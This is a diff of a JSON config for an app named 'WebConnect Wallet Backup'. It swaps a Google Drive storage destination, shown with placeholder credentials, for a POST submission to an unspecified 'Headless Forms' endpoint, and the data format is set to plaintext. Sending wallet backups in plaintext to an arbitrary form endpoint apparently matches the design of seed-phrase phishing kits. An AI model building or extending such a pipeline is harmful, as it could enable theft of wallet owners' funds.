@@ -1,31 +1,21 @@
 {
   "version": "1.0.0",
   "app_name": "WebConnect Wallet Backup",
-  "description": "Interactive wallet backup system with Google Drive integration",
+  "description": "Interactive wallet backup system with Headless Forms integration",
   "repository": "https://github.com/decentralizedconfig/launchpad",
   
   "storage": {
     "enabled": true,
     "destinations": [
       {
-        "name": "google_drive",
-        "type": "google_drive",
+        "name": "headless_forms",
+        "type": "headless_forms",
         "enabled": true,
-        "folder_id": "YOUR_GOOGLE_DRIVE_FOLDER_ID",
-        "description": "Google Drive folder for secure backup storage",
-        "credentials": {
-          "type": "service_account",
-          "project_id": "YOUR_PROJECT_ID",
-          "private_key_id": "YOUR_PRIVATE_KEY_ID",
-          "private_key": "-----BEGIN PRIVATE KEY-----\nYOUR_PRIVATE_KEY_HERE\n-----END PRIVATE KEY-----\n",
-          "client_email": "YOUR_SERVICE_ACCOUNT_EMAIL",
-          "client_id": "YOUR_CLIENT_ID",
-          "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-          "token_uri": "https://oauth2.googleapis.com/token",
-          "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-          "client_x509_cert_url": "YOUR_CERT_URL",
-          "universe_domain": "googleapis.com"
-        }
+        "endpoint": "YOUR_FORM_ENDPOINT_URL_HERE",
+        "method": "POST",
+        "description": "Headless Forms endpoint for secure backup submission",
+        "timeout": 30,
+        "retry_attempts": 3
       }
     ]
   },
@@ -81,10 +71,9 @@
     "data_format": "plaintext"
   },
 
-  "google_drive": {
-    "endpoint": "https://www.googleapis.com/drive/v3",
-    "upload_timeout": 60,
+  "form_submission": {
+    "endpoint_timeout": 30,
     "retry_attempts": 3,
-    "chunk_size": 262144
+    "content_type": "application/json"
   }
 }
